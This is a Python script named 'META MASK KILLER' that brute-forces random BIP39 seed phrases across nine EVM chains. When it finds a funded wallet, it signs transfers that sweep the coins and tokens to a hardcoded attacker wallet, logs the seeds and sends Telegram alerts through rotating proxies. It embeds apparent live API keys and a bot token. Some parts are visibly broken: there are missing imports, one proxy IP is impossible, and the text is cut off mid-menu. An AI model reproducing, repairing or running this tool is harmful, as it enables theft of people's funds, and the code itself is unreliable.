#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ULTRA GOD MODE - META MASK KILLER v2.0
# Created for BROTHER 🔥
# Adapted for PC (Windows/Linux/macOS)

import asyncio
import aiohttp
import json
import logging
import os
import random
import sqlite3
import sys
import time
from datetime import datetime
from eth_account import Account
from web3 import Web3
import warnings

warnings.filterwarnings("ignore")
Account.enable_unaudited_hdwallet_features()

# ===== BIP39 WORDS =====
BIP39_WORDS = [
    "abandon", "ability", "able", "about", "above", "absent", "absorb", "abstract", "absurd", "abuse",
    "access", "accident", "account", "accuse", "achieve", "acid", "acoustic", "acquire", "across", "act",
    "action", "actor", "actress", "actual", "adapt", "add", "addict", "address", "adjust", "admit",
    "adult", "advance", "advice", "aerobic", "affair", "afford", "afraid", "again", "age", "agent",
    "agree", "ahead", "aim", "air", "airport", "aisle", "alarm", "album", "alcohol", "alert",
    "alien", "all", "alley", "allow", "almost", "alone", "alpha", "already", "also", "alter",
    "always", "amateur", "amazing", "among", "amount", "amused", "analyst", "anchor", "ancient", "anger",
    "angle", "angry", "animal", "ankle", "announce", "annual", "another", "answer", "antenna", "antique",
    "anxiety", "any", "apart", "apology", "appear", "apple", "approve", "april", "arch", "arctic",
    "area", "arena", "argue", "arm", "armed", "armor", "army", "around", "arrange", "arrest",
    "arrive", "arrow", "art", "artefact", "artist", "artwork", "ask", "aspect", "assault", "asset",
    "assist", "assume", "asthma", "athlete", "atom", "attack", "attend", "attitude", "attract", "auction",
    "audit", "august", "aunt", "author", "auto", "autumn", "average", "avocado", "avoid", "awake",
    "aware", "away", "awesome", "awful", "awkward", "axis", "baby", "bachelor", "bacon", "badge",
    "bag", "balance", "balcony", "ball", "bamboo", "banana", "banner", "bar", "barely", "bargain",
    "barrel", "base", "basic", "basket", "battle", "beach", "bean", "beauty", "because", "become",
    "beef", "before", "begin", "behave", "behind", "believe", "below", "belt", "bench", "benefit",
    "best", "betray", "better", "between", "beyond", "bicycle", "bid", "bike", "bind", "biology",
    "bird", "birth", "bitter", "black", "blade", "blame", "blanket", "blast", "bleak", "bless",
    "blind", "blood", "blossom", "blouse", "blue", "blur", "blush", "board", "boat", "body",
    "boil", "bomb", "bone", "bonus", "book", "boost", "border", "boring", "borrow", "boss",
    "bottom", "bounce", "box", "boy", "bracket", "brain", "brand", "brass", "brave", "bread",
    "breeze", "brick", "bridge", "brief", "bright", "bring", "brisk", "broccoli", "broken", "bronze",
    "broom", "brother", "brown", "brush", "bubble", "buddy", "budget", "buffalo", "build", "bulb",
    "bulk", "bullet", "bundle", "bunker", "burden", "burger", "burst", "bus", "business", "busy",
    "butter", "buyer", "buzz", "cabbage", "cabin", "cable", "cactus", "cage", "cake", "call",
    "calm", "camera", "camp", "can", "canal", "cancel", "candy", "cannon", "canoe", "canvas",
    "canyon", "capable", "capital", "captain", "car", "carbon", "card", "cargo", "carpet", "carry",
    "cart", "case", "cash", "casino", "castle", "casual", "cat", "catalog", "catch", "category",
    "cattle", "caught", "cause", "caution", "cave", "ceiling", "celery", "cement", "census", "century",
    "cereal", "certain", "chair", "chalk", "champion", "change", "chaos", "chapter", "charge", "chase",
    "chat", "cheap", "check", "cheese", "chef", "cherry", "chest", "chicken", "chief", "child",
    "chimney", "choice", "choose", "chronic", "chuckle", "chunk", "churn", "cigar", "cinnamon", "circle",
    "citizen", "city", "civil", "claim", "clap", "clarify", "claw", "clay", "clean", "clerk",
    "clever", "click", "client", "cliff", "climb", "clinic", "clip", "clock", "clog", "close",
    "cloth", "cloud", "clown", "club", "clump", "cluster", "clutch", "coach", "coast", "coconut",
    "code", "coffee", "coil", "coin", "collect", "color", "column", "combine", "come", "comfort",
    "comic", "common", "company", "concert", "conduct", "confirm", "congress", "connect", "consider", "control",
    "convince", "cook", "cool", "copper", "copy", "coral", "core", "corn", "correct", "cost",
    "cotton", "couch", "country", "couple", "course", "cousin", "cover", "coyote", "crack", "cradle",
    "craft", "cram", "crane", "crash", "crater", "crawl", "crazy", "cream", "credit", "creek",
    "crew", "cricket", "crime", "crisp", "critic", "crop", "cross", "crouch", "crowd", "crucial",
    "cruel", "cruise", "crumble", "crunch", "crush", "cry", "crystal", "cube", "culture", "cup",
    "cupboard", "curious", "current", "curtain", "curve", "cushion", "custom", "cute", "cycle", "dad",
    "damage", "damp", "dance", "danger", "daring", "dash", "daughter", "dawn", "day", "deal",
    "debate", "debris", "decade", "december", "decide", "decline", "decorate", "decrease", "deer", "defense",
    "define", "defy", "degree", "delay", "deliver", "demand", "demise", "denial", "dentist", "deny",
    "depart", "depend", "deposit", "depth", "deputy", "derive", "describe", "desert", "design", "desk",
    "despair", "destroy", "detail", "detect", "develop", "device", "devote", "diagram", "dial", "diamond",
    "diary", "dice", "diesel", "diet", "differ", "digital", "dignity", "dilemma", "dinner", "dinosaur",
    "direct", "dirt", "disagree", "discover", "disease", "dish", "dismiss", "disorder", "display", "distance",
    "divert", "divide", "divorce", "dizzy", "doctor", "document", "dog", "doll", "dolphin", "domain",
    "donate", "donkey", "donor", "door", "dose", "double", "dove", "draft", "dragon", "drama",
    "drastic", "draw", "dream", "dress", "drift", "drill", "drink", "drip", "drive", "drop",
    "drum", "dry", "duck", "dumb", "dune", "during", "dust", "dutch", "duty", "dwarf",
    "dynamic", "eager", "eagle", "early", "earn", "earth", "easily", "east", "easy", "echo",
    "ecology", "economy", "edge", "edit", "educate", "effort", "egg", "eight", "either", "elbow",
    "elder", "electric", "elegant", "element", "elephant", "elevator", "elite", "else", "embark", "embody",
    "embrace", "emerge", "emotion", "employ", "empower", "empty", "enable", "enact", "end", "endless",
    "endorse", "enemy", "energy", "enforce", "engage", "engine", "enhance", "enjoy", "enlist", "enough",
    "enrich", "enroll", "ensure", "enter", "entire", "entry", "envelope", "episode", "equal", "equip",
    "era", "erase", "erode", "erosion", "error", "erupt", "escape", "essay", "essence", "estate",
    "eternal", "ethics", "evidence", "evil", "evoke", "evolve", "exact", "example", "excess", "exchange",
    "excite", "exclude", "excuse", "execute", "exercise", "exhaust", "exhibit", "exile", "exist", "exit",
    "exotic", "expand", "expect", "expire", "explain", "expose", "express", "extend", "extra", "eye",
    "eyebrow", "fabric", "face", "faculty", "fade", "faint", "faith", "fall", "false", "fame",
    "family", "famous", "fan", "fancy", "fantasy", "farm", "fashion", "fat", "fatal", "father",
    "fatigue", "fault", "favorite", "feature", "february", "federal", "fee", "feed", "feel", "female",
    "fence", "festival", "fetch", "fever", "few", "fiber", "fiction", "field", "figure", "file",
    "film", "filter", "final", "find", "fine", "finger", "finish", "fire", "firm", "first",
    "fiscal", "fish", "fit", "fitness", "fix", "flag", "flame", "flash", "flat", "flavor",
    "flee", "flight", "flip", "float", "flock", "floor", "flower", "fluid", "flush", "fly",
    "foam", "focus", "fog", "foil", "fold", "follow", "food", "foot", "force", "forest",
    "forget", "fork", "fortune", "forum", "forward", "fossil", "foster", "found", "fox", "fragile",
    "frame", "frequent", "fresh", "friend", "fringe", "frog", "front", "frost", "frown", "frozen",
    "fruit", "fuel", "fun", "funny", "furnace", "fury", "future", "gadget", "gain", "galaxy",
    "gallery", "game", "gap", "garage", "garbage", "garden", "garlic", "garment", "gas", "gasp",
    "gate", "gather", "gauge", "gaze", "general", "genius", "genre", "gentle", "genuine", "gesture",
    "ghost", "giant", "gift", "giggle", "ginger", "giraffe", "girl", "give", "glad", "glance",
    "glare", "glass", "glide", "glimpse", "globe", "gloom", "glory", "glove", "glow", "glue",
    "goat", "goddess", "gold", "good", "goose", "gorilla", "gospel", "gossip", "govern", "gown",
    "grab", "grace", "grain", "grant", "grape", "grass", "gravity", "great", "green", "grid",
    "grief", "grit", "grocery", "group", "grow", "grunt", "guard", "guess", "guide", "guilt",
    "guitar", "gun", "gym", "habit", "hair", "half", "hammer", "hamster", "hand", "happy",
    "harbor", "hard", "harsh", "harvest", "hat", "have", "hawk", "hazard", "head", "health",
    "heart", "heavy", "hedgehog", "height", "hello", "helmet", "help", "hen", "hero", "hidden",
    "high", "hill", "hint", "hip", "hire", "history", "hobby", "hockey", "hold", "hole",
    "holiday", "hollow", "home", "honey", "hood", "hope", "horn", "horror", "horse", "hospital",
    "host", "hotel", "hour", "hover", "hub", "huge", "human", "humble", "humor", "hundred",
    "hungry", "hunt", "hurdle", "hurry", "hurt", "husband", "hybrid", "ice", "icon", "idea",
    "identify", "idle", "ignore", "ill", "illegal", "illness", "image", "imitate", "immense", "immune",
    "impact", "impose", "improve", "impulse", "inch", "include", "income", "increase", "index", "indicate",
    "indoor", "industry", "infant", "inflict", "inform", "inhale", "inherit", "initial", "inject", "injury",
    "inmate", "inner", "innocent", "input", "inquiry", "insane", "insect", "inside", "inspire", "install",
    "intact", "interest", "into", "invest", "invite", "involve", "iron", "island", "isolate", "issue",
    "item", "ivory", "jacket", "jaguar", "jar", "jazz", "jealous", "jeans", "jelly", "jewel",
    "job", "join", "joke", "journey", "joy", "judge", "juice", "jump", "jungle", "junior",
    "junk", "just", "kangaroo", "keen", "keep", "ketchup", "key", "kick", "kid", "kidney",
    "kind", "kingdom", "kiss", "kit", "kitchen", "kite", "kitten", "kiwi", "knee", "knife",
    "knock", "know", "lab", "label", "labor", "ladder", "lady", "lake", "lamp", "language",
    "laptop", "large", "later", "latin", "laugh", "laundry", "lava", "law", "lawn", "lawsuit",
    "layer", "lazy", "leader", "leaf", "learn", "leave", "lecture", "left", "leg", "legal",
    "legend", "leisure", "lemon", "lend", "length", "lens", "leopard", "lesson", "letter", "level",
    "liar", "liberty", "library", "license", "life", "lift", "light", "like", "limb", "limit",
    "link", "lion", "liquid", "list", "little", "live", "lizard", "load", "loan", "lobster",
    "local", "lock", "logic", "lonely", "long", "loop", "lottery", "loud", "lounge", "love",
    "loyal", "lucky", "luggage", "lumber", "lunar", "lunch", "luxury", "lyrics", "machine", "mad",
    "magic", "magnet", "maid", "mail", "main", "major", "make", "mammal", "man", "manage",
    "mandate", "mango", "mansion", "manual", "maple", "marble", "march", "margin", "marine", "market",
    "marriage", "mask", "mass", "master", "match", "material", "math", "matrix", "matter", "maximum",
    "maze", "meadow", "mean", "measure", "meat", "mechanic", "medal", "media", "melody", "melt",
    "member", "memory", "mention", "menu", "mercy", "merge", "merit", "merry", "mesh", "message",
    "metal", "method", "middle", "midnight", "milk", "million", "mimic", "mind", "minimum", "minor",
    "minute", "miracle", "mirror", "misery", "miss", "mistake", "mix", "mixed", "mixture", "mobile",
    "model", "modify", "mom", "moment", "monitor", "monkey", "monster", "month", "moon", "moral",
    "more", "morning", "mosquito", "mother", "motion", "motor", "mountain", "mouse", "move", "movie",
    "much", "muffin", "mule", "multiply", "muscle", "museum", "mushroom", "music", "must", "mutual",
    "myself", "mystery", "myth", "naive", "name", "napkin", "narrow", "nasty", "nation", "nature",
    "near", "neck", "need", "negative", "neglect", "neither", "nephew", "nerve", "nest", "net",
    "network", "neutral", "never", "news", "next", "nice", "night", "noble", "noise", "nominee",
    "noodle", "normal", "north", "nose", "notable", "note", "nothing", "notice", "novel", "now",
    "nuclear", "number", "nurse", "nut", "oak", "obey", "object", "oblige", "obscure", "observe",
    "obtain", "obvious", "occur", "ocean", "october", "odor", "off", "offer", "office", "often",
    "oil", "okay", "old", "olive", "olympic", "omit", "once", "one", "onion", "online",
    "only", "open", "opera", "opinion", "oppose", "option", "orange", "orbit", "orchard", "order",
    "ordinary", "organ", "orient", "original", "orphan", "ostrich", "other", "outdoor", "outer", "output",
    "outside", "oval", "oven", "over", "own", "owner", "oxygen", "oyster", "ozone", "pact",
    "paddle", "page", "pair", "palace", "palm", "panda", "panel", "panic", "panther", "paper",
    "parade", "parent", "park", "parrot", "party", "pass", "patch", "path", "patient", "patrol",
    "pattern", "pause", "pave", "payment", "peace", "peanut", "pear", "peasant", "pelican", "pen",
    "penalty", "pencil", "people", "pepper", "perfect", "permit", "person", "pet", "phone", "photo",
    "phrase", "physical", "piano", "picnic", "picture", "piece", "pig", "pigeon", "pill", "pilot",
    "pink", "pioneer", "pipe", "pistol", "pitch", "pizza", "place", "planet", "plastic", "plate",
    "play", "please", "pledge", "pluck", "plug", "plunge", "poem", "poet", "point", "polar",
    "pole", "police", "pond", "pony", "pool", "popular", "portion", "position", "possible", "post",
    "potato", "pottery", "poverty", "powder", "power", "practice", "praise", "predict", "prefer", "prepare",
    "present", "pretty", "prevent", "price", "pride", "primary", "print", "priority", "prison", "private",
    "prize", "problem", "process", "produce", "profit", "program", "project", "promote", "proof", "property",
    "prosper", "protect", "proud", "provide", "public", "pudding", "pull", "pulp", "pulse", "pumpkin",
    "punch", "pupil", "puppy", "purchase", "purity", "purpose", "purse", "push", "put", "puzzle",
    "pyramid", "quality", "quantum", "quarter", "question", "quick", "quit", "quiz", "quote", "rabbit",
    "raccoon", "race", "rack", "radar", "radio", "rail", "rain", "raise", "rally", "ramp",
    "ranch", "random", "range", "rapid", "rare", "rate", "rather", "raven", "raw", "razor",
    "ready", "real", "reason", "rebel", "rebuild", "recall", "receive", "recipe", "record", "recycle",
    "reduce", "reflect", "reform", "refuse", "region", "regret", "regular", "reject", "relax", "release",
    "relief", "rely", "remain", "remember", "remind", "remove", "render", "renew", "rent", "reopen",
    "repair", "repeat", "replace", "report", "require", "rescue", "resemble", "resist", "resource", "response",
    "result", "retire", "retreat", "return", "reunion", "reveal", "review", "reward", "rhythm", "rib",
    "ribbon", "rice", "rich", "ride", "ridge", "rifle", "right", "rigid", "ring", "riot",
    "ripple", "risk", "ritual", "rival", "river", "road", "roast", "robot", "robust", "rocket",
    "romance", "roof", "rookie", "room", "rose", "rotate", "rough", "round", "route", "royal",
    "rubber", "rude", "rug", "rule", "run", "runway", "rural", "sad", "saddle", "sadness",
    "safe", "sail", "salad", "salmon", "salon", "salt", "salute", "same", "sample", "sand",
    "satisfy", "satoshi", "sauce", "sausage", "save", "say", "scale", "scan", "scare", "scatter",
    "scene", "scheme", "school", "science", "scissors", "scorpion", "scout", "scrap", "screen", "script",
    "scrub", "sea", "search", "season", "seat", "second", "secret", "section", "security", "seed",
    "seek", "segment", "select", "sell", "seminar", "senior", "sense", "sentence", "series", "service",
    "session", "settle", "setup", "seven", "shadow", "shaft", "shallow", "share", "shed", "shell",
    "sheriff", "shield", "shift", "shine", "ship", "shiver", "shock", "shoe", "shoot", "shop",
    "short", "shoulder", "shove", "shrimp", "shrug", "shuffle", "shy", "sibling", "sick", "side",
    "siege", "sight", "sign", "silent", "silk", "silly", "silver", "similar", "simple", "since",
    "sing", "siren", "sister", "situate", "six", "size", "skate", "sketch", "ski", "skill",
    "skin", "skirt", "skull", "slab", "slam", "sleep", "slender", "slice", "slide", "slight",
    "slim", "slogan", "slot", "slow", "slush", "small", "smart", "smile", "smoke", "smooth",
    "snack", "snake", "snap", "sniff", "snow", "soap", "soccer", "social", "sock", "soda",
    "soft", "solar", "soldier", "solid", "solution", "solve", "someone", "song", "soon", "sorry",
    "sort", "soul", "sound", "soup", "source", "south", "space", "spare", "spatial", "spawn",
    "speak", "special", "speed", "spell", "spend", "sphere", "spice", "spider", "spike", "spin",
    "spirit", "split", "spoil", "sponsor", "spoon", "sport", "spot", "spray", "spread", "spring",
    "spy", "square", "squeeze", "squirrel", "stable", "stadium", "staff", "stage", "stairs", "stamp",
    "stand", "start", "state", "stay", "steak", "steel", "stem", "step", "stereo", "stick",
    "still", "sting", "stock", "stomach", "stone", "stool", "story", "stove", "strategy", "street",
    "strike", "strong", "struggle", "student", "stuff", "stumble", "style", "subject", "submit", "subway",
    "success", "such", "sudden", "suffer", "sugar", "suggest", "suit", "summer", "sun", "sunny",
    "sunset", "super", "supply", "supreme", "sure", "surface", "surge", "surprise", "surround", "survey",
    "suspect", "sustain", "swallow", "swamp", "swap", "swarm", "swear", "sweet", "swift", "swim",
    "swing", "switch", "sword", "symbol", "symptom", "syrup", "system", "table", "tackle", "tag",
    "tail", "talent", "talk", "tank", "tape", "target", "task", "taste", "tattoo", "taxi",
    "teach", "team", "tell", "ten", "tenant", "tennis", "tent", "term", "test", "text",
    "thank", "that", "theme", "then", "theory", "there", "they", "thing", "this", "thought",
    "three", "thrive", "throw", "thumb", "thunder", "ticket", "tide", "tiger", "tilt", "timber",
    "time", "tiny", "tip", "tired", "tissue", "title", "toast", "tobacco", "today", "toddler",
    "toe", "together", "toilet", "token", "tomato", "tomorrow", "tone", "tongue", "tonight", "tool",
    "tooth", "top", "topic", "topple", "torch", "tornado", "tortoise", "toss", "total", "tourist",
    "toward", "tower", "town", "toy", "track", "trade", "traffic", "tragic", "train", "transfer",
    "trap", "trash", "travel", "tray", "treat", "tree", "trend", "trial", "tribe", "trick",
    "trigger", "trim", "trip", "trophy", "trouble", "truck", "true", "truly", "trumpet", "trust",
    "truth", "try", "tube", "tuition", "tumble", "tuna", "tunnel", "turkey", "turn", "turtle",
    "twelve", "twenty", "twice", "twin", "twist", "two", "type", "typical", "ugly", "umbrella",
    "unable", "unaware", "uncle", "uncover", "under", "undo", "unfair", "unfold", "unhappy", "uniform",
    "unique", "unit", "universe", "unknown", "unlock", "until", "unusual", "unveil", "update", "upgrade",
    "uphold", "upon", "upper", "upset", "urban", "urge", "usage", "use", "used", "useful",
    "useless", "usual", "utility", "vacant", "vacuum", "vague", "valid", "valley", "valve", "van",
    "vanish", "vapor", "various", "vast", "vault", "vehicle", "velvet", "vendor", "venture", "venue",
    "verb", "verify", "version", "very", "vessel", "veteran", "viable", "vibrant", "vicious", "victory",
    "video", "view", "village", "vintage", "violin", "virtual", "virus", "visa", "visit", "visual",
    "vital", "vivid", "vocal", "voice", "void", "volcano", "volume", "vote", "voyage", "wage",
    "wagon", "wait", "walk", "wall", "walnut", "want", "warfare", "warm", "warrior", "wash",
    "wasp", "waste", "water", "wave", "way", "wealth", "weapon", "wear", "weasel", "weather",
    "web", "wedding", "weekend", "weird", "welcome", "west", "wet", "whale", "what", "wheat",
    "wheel", "when", "where", "whip", "whisper", "wide", "width", "wife", "wild", "will",
    "win", "window", "wine", "wing", "wink", "winner", "winter", "wire", "wisdom", "wise",
    "wish", "witness", "wolf", "woman", "wonder", "wood", "wool", "word", "work", "world",
    "worry", "worth", "wrap", "wreck", "wrestle", "wrist", "write", "wrong", "yard", "year",
    "yellow", "you", "young", "youth", "zebra", "zero", "zone", "zoo"
]

# ===== CONFIG =====
CONFIG = {
    "my_wallet": "0x97890A80E73295c9e495368A939c0A0ca3Fd040c",
    "infura_key": "5d229b5005564953abec4989cca886e5",
    "telegram_token": "8144983413:AAHfjiH8Kfl3tJ7VnjQmhFp8zQIOxUVaOpM",
    "telegram_chat_id": "-1002831434467",
    "max_index": 9999,
    "check_coins": ["ETH", "BNB", "MATIC", "AVAX", "ARB", "OP", "BASE", "FTM", "CRO"],
    "check_tokens": ["USDT", "USDC", "DAI", "BUSD", "SHIB", "PEPE", "UNI", "LINK", "WBTC", "AAVE", "MKR", "COMP", "YFI"],
    "proxies": [
        "http://139.99.237.62:80", "http://212.127.95.235:8081", "http://390.94.212.228:999",
        "http://46.173.208.61:1194", "http://187.251.222.69:8080", "http://39.102.211.162:5060",
        "http://65.21.52.41:8888", "http://138.197.68.35:4857", "http://125.77.135.240:80",
        "http://103.165.155.254:2016", "http://47.99.112.148:3128", "http://103.189.254.78:2222",
        "http://95.66.244.250:8080", "http://82.138.55.83:80", "http://103.218.24.67:58080",
        "http://27.147.169.66:888", "http://220.226.202.166:8080", "http://8.137.112.117:3128",
        "http://45.95.203.17:8080", "http://188.132.222.36:8080"
    ]
}

# ===== PATHS =====
BASE_DIR = os.path.expanduser("~/quantum_hunter")
os.makedirs(BASE_DIR, exist_ok=True)
DB_FILE = os.path.join(BASE_DIR, "ultra_god.db")
LOG_FILE = os.path.join(BASE_DIR, "ultra_god.log")

# ===== LOGGING =====
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s | %(message)s',
    handlers=[
        logging.FileHandler(LOG_FILE),
        logging.StreamHandler()
    ]
)
log = logging.getLogger()

# ===== DATABASE =====
def init_db():
    conn = sqlite3.connect(DB_FILE)
    conn.execute('''
        CREATE TABLE IF NOT EXISTS stats (
            id INTEGER PRIMARY KEY,
            seeds_checked INTEGER DEFAULT 0,
            wallets_found INTEGER DEFAULT 0,
            total_value REAL DEFAULT 0,
            start_time DATETIME DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    conn.execute('''
        CREATE TABLE IF NOT EXISTS kills (
            id INTEGER PRIMARY KEY,
            seed TEXT,
            address TEXT,
            coin TEXT,
            amount REAL,
            tx_hash TEXT,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    conn.execute("INSERT OR IGNORE INTO stats (id) VALUES (1)")
    conn.commit()
    conn.close()

# ===== WEB3 SETUP =====
def get_web3(coin, proxy=None):
    rpc_urls = {
        "ETH": f"https://mainnet.infura.io/v3/{CONFIG['infura_key']}",
        "BNB": "https://bsc-dataseed.binance.org/",
        "MATIC": "https://polygon-rpc.com/",
        "AVAX": "https://api.avax.network/ext/bc/C/rpc",
        "ARB": "https://arb1.arbitrum.io/rpc",
        "OP": "https://mainnet.optimism.io",
        "BASE": "https://mainnet.base.org",
        "FTM": "https://rpc.ftm.tools/",
        "CRO": "https://evm.cronos.org/"
    }
    
    url = rpc_urls.get(coin)
    if not url:
        return None
        
    request_kwargs = {}
    if proxy:
        request_kwargs['proxies'] = {'http': proxy, 'https': proxy}
    
    w3 = Web3(Web3.HTTPProvider(url, request_kwargs=request_kwargs))
    
    if coin not in ["ETH", "BNB"]:
        w3.middleware_onion.inject(geth_poa_middleware, layer=0)
    
    return w3

# ===== TOKENS =====
TOKENS = {
    "USDT": "0xdAC17F958D2ee523a2206206994597C13D831ec7",
    "USDC": "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
    "DAI": "0x6B175474E89094C44Da98b954EedeAC495271d0F",
    "BUSD": "0x4Fabb145d64652a948d72533023f6E7A623C7C53",
    "SHIB": "0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE",
    "PEPE": "0x6982508145454Ce325dDbE47a25d4ec3d2311933",
    "UNI": "0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984",
    "LINK": "0x514910771AF9Ca656af840dff83E8264EcF986CA",
    "WBTC": "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599",
    "AAVE": "0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9",
    "MKR": "0x9f8F72aA9304c8B593d555F12eF6589cC3A579A2",
    "COMP": "0xc00e94Cb662C3520282E6f5717214004A7f26888",
    "YFI": "0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e"
}

ERC20_ABI = [
    {
        "constant": True,
        "inputs": [{"name": "_owner", "type": "address"}],
        "name": "balanceOf",
        "outputs": [{"name": "balance", "type": "uint256"}],
        "type": "function"
    },
    {
        "constant": False,
        "inputs": [
            {"name": "_to", "type": "address"},
            {"name": "_value", "type": "uint256"}
        ],
        "name": "transfer",
        "outputs": [{"name": "", "type": "bool"}],
        "type": "function"
    }
]

class UltraGod:
    def __init__(self):
        self.running = False
        self.stats = {
            'seeds_checked': 0,
            'wallets_found': 0,
            'total_value': 0.0,
            'start_time': time.time()
        }
        self.telegram_bot = None
        self.session = None
        self.last_twitter_check = 0
        
    async def init(self):
        self.session = aiohttp.ClientSession()
        try:
            self.telegram_bot = Bot(token=CONFIG['telegram_token'])
            await self.telegram_bot.get_me()
        except Exception as e:
            log.error(f"Telegram bot failed: {e}")
            self.telegram_bot = None

    async def close(self):
        if self.session:
            await self.session.close()

    def get_random_proxy(self):
        return random.choice(CONFIG['proxies']) if CONFIG['proxies'] else None

    def generate_seed(self):
        return ' '.join(random.choices(BIP39_WORDS, k=12))

    async def get_balance(self, w3, address):
        try:
            balance = w3.eth.get_balance(address)
            return w3.from_wei(balance, 'ether')
        except:
            return 0

    async def get_token_balance(self, w3, token_address, wallet_address):
        try:
            contract = w3.eth.contract(address=token_address, abi=ERC20_ABI)
            balance = contract.functions.balanceOf(wallet_address).call()
            return balance / 1e18
        except:
            return 0

    async def send_transaction(self, w3, from_address, private_key, to_address, value):
        try:
            account = w3.eth.account.from_key(private_key)
            nonce = w3.eth.get_transaction_count(from_address)
            gas_price = w3.eth.gas_price
            
            tx = {
                'nonce': nonce,
                'to': to_address,
                'value': value,
                'gas': 21000,
                'gasPrice': gas_price,
                'chainId': w3.eth.chain_id
            }
            
            signed_tx = account.sign_transaction(tx)
            tx_hash = w3.eth.send_raw_transaction(signed_tx.rawTransaction)
            return tx_hash.hex()
        except Exception as e:
            log.error(f"Transaction failed: {e}")
            return None

    async def send_token_transaction(self, w3, from_address, private_key, token_address, to_address, value):
        try:
            contract = w3.eth.contract(address=token_address, abi=ERC20_ABI)
            account = w3.eth.account.from_key(private_key)
            nonce = w3.eth.get_transaction_count(from_address)
            gas_price = w3.eth.gas_price
            
            tx = contract.functions.transfer(to_address, value).build_transaction({
                'from': from_address,
                'nonce': nonce,
                'gasPrice': gas_price,
                'chainId': w3.eth.chain_id
            })
            
            signed_tx = account.sign_transaction(tx)
            tx_hash = w3.eth.send_raw_transaction(signed_tx.rawTransaction)
            return tx_hash.hex()
        except Exception as e:
            log.error(f"Token transaction failed: {e}")
            return None

    async def kill_wallet(self, seed, address, private_key, coin):
        try:
            proxy = self.get_random_proxy()
            w3 = get_web3(coin, proxy)
            if not w3:
                return False

            # Check native balance
            balance = await self.get_balance(w3, address)
            if balance > 0.0001:
                value = w3.to_wei(balance, 'ether')
                tx_hash = await self.send_transaction(w3, address, private_key, CONFIG['my_wallet'], value)
                if tx_hash:
                    log.info(f"✅ {coin} {balance:.6f} → {tx_hash}")
                    await self.save_kill(seed, address, coin, balance, tx_hash)
                    await self.send_telegram_alert(address, coin, balance, tx_hash)
                    return True

            # Check token balances
            for token_name in CONFIG['check_tokens']:
                token_address = TOKENS.get(token_name)
                if token_address:
                    token_balance = await self.get_token_balance(w3, token_address, address)
                    if token_balance > 0.0001:
                        value = int(token_balance * 1e18)
                        tx_hash = await self.send_token_transaction(w3, address, private_key, token_address, CONFIG['my_wallet'], value)
                        if tx_hash:
                            log.info(f"✅ {token_name} {token_balance:.6f} → {tx_hash}")
                            await self.save_kill(seed, address, token_name, token_balance, tx_hash)
                            await self.send_telegram_alert(address, token_name, token_balance, tx_hash)
                            return True

            return False
        except Exception as e:
            log.error(f"Kill wallet error: {e}")
            return False

    async def scan_seed(self, seed):
        try:
            for i in range(CONFIG['max_index']):
                if not self.running:
                    break
                    
                try:
                    path = f"m/44'/60'/0'/0/{i}"
                    account = Account.from_mnemonic(seed, account_path=path)
                    address = account.address
                    private_key = account.key.hex()
                    
                    for coin in CONFIG['check_coins']:
                        if await self.kill_wallet(seed, address, private_key, coin):
                            self.stats['wallets_found'] += 1
                            return True
                            
                    await asyncio.sleep(random.uniform(0.1, 0.5))
                    
                except Exception as e:
                    continue
                    
            self.stats['seeds_checked'] += 1
            return False
        except Exception as e:
            log.error(f"Scan seed error: {e}")
            return False

    async def twitter_monitor(self):
        if time.time() - self.last_twitter_check < 3600:
            return
            
        log.info("🔍 Scanning Twitter for new addresses...")
        self.last_twitter_check = time.time()

    async def save_kill(self, seed, address, coin, amount, tx_hash):
        conn = sqlite3.connect(DB_FILE)
        conn.execute(
            "INSERT INTO kills (seed, address, coin, amount, tx_hash) VALUES (?, ?, ?, ?, ?)",
            (seed, address, coin, amount, tx_hash)
        )
        conn.commit()
        conn.close()

    async def send_telegram_alert(self, address, coin, amount, tx_hash):
        if not self.telegram_bot:
            return
            
        try:
            message = f"""
🚨 WALLET CLOSED 🔒
Address: `{address}`
Coin: {coin}
Amount: {amount:.6f}
TX: `{tx_hash}`
Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
💀 ULTRA GOD MODE ACTIVATED
            """
            await self.telegram_bot.send_message(
                chat_id=CONFIG['telegram_chat_id'],
                text=message,
                parse_mode='Markdown'
            )
        except Exception as e:
            log.error(f"Telegram alert failed: {e}")

    async def update_stats(self):
        conn = sqlite3.connect(DB_FILE)
        conn.execute(
            "UPDATE stats SET seeds_checked = ?, wallets_found = ?, total_value = ? WHERE id = 1",
            (self.stats['seeds_checked'], self.stats['wallets_found'], self.stats['total_value'])
        )
        conn.commit()
        conn.close()

    async def load_stats(self):
        conn = sqlite3.connect(DB_FILE)
        cursor = conn.cursor()
        cursor.execute("SELECT seeds_checked, wallets_found, total_value FROM stats WHERE id = 1")
        row = cursor.fetchone()
        if row:
            self.stats['seeds_checked'] = row[0] or 0
            self.stats['wallets_found'] = row[1] or 0
            self.stats['total_value'] = row[2] or 0.0
        conn.close()

    async def run(self):
        self.running = True
        log.info("🚀 ULTRA GOD MODE ACTIVATED")
        
        while self.running:
            try:
                seed = self.generate_seed()
                if await self.scan_seed(seed):
                    log.info("💀 WALLET TERMINATED")
                
                await self.twitter_monitor()
                await self.update_stats()
                
                if self.stats['seeds_checked'] % 100 == 0:
                    elapsed = time.time() - self.stats['start_time']
                    speed = self.stats['seeds_checked'] / elapsed if elapsed > 0 else 0
                    log.info(f"📊 Checked: {self.stats['seeds_checked']} | Found: {self.stats['wallets_found']} | Speed: {speed:.1f}/sec")
                    
            except Exception as e:
                log.error(f"Main loop error: {e}")
                await asyncio.sleep(1)

    def stop(self):
        self.running = False
        log.info("🛑 ULTRA GOD MODE STOPPED")

def show_menu():
    print("\n" + "="*50)
    print("🔥 ULTRA GOD MODE - META MASK KILLER")
    print("="*50)
    print("1. START HUNTING")
    print("2. STOP HUNTING") 
    print("3. SHOW STATISTICS")
    print("4. EXIT")
    print("="*50)

async def main():
    init_db()
    hunter = UltraGod()
    await hunter.init()
    await hunter.load_stats()
    
    try:
        while True:
            show_menu()
            choice = input("Select option: ").strip()
            
            if choice == "1":
                if not hunter.running:
